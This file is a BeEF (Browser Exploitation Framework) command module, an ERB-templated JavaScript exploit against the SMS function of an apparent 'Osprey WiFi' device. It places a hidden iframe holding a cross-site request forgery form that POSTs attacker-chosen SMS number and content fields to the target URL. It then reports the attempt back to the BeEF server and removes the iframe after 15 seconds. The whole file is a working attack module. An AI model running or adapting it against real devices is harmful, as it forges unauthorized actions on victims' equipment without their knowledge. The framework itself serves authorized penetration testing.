//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var target_url = '<%= @target_url.to_s.gsub(/'/, "\\'") %>'; 
  var timeout = 15;

  exploit = function() {
    var osprey_wifi_sms_injection_exploit_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(target_url, 'POST', '',
      [
        {'type':'hidden', 'name':'rand', 'value':'<%= CGI.escape(@input_1) %>' },
        {'type':'hidden', 'name':'sms_id', 'value':'<%= CGI.escape(@input_2) %>' },
        {'type':'hidden', 'name':'action_type', 'value':'<%= CGI.escape(@input_3) %>' },
        {'type':'hidden', 'name':'sms_time', 'value':'<%= CGI.escape(@input_4) %>' },
        {'type':'hidden', 'name':'sms_number', 'value':'<%= CGI.escape(@input_5) %>' },
        {'type':'hidden', 'name':'sms_content', 'value':'<%= CGI.escape(@input_6) %>' },
      ]);

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
  }

  cleanup = function() {
    try {
      document.body.removeChild(osprey_wifi_sms_injection_exploit_iframe_<%= @command_id %>);
    } catch(e) {
      beef.debug("Could not remove iframe: " + e.message);
    }
  }
  setTimeout("cleanup()", timeout*1000);

  try {
    exploit();
  } catch(e) {
    beef.debug("Exploit failed: " + e.message);
  }

});
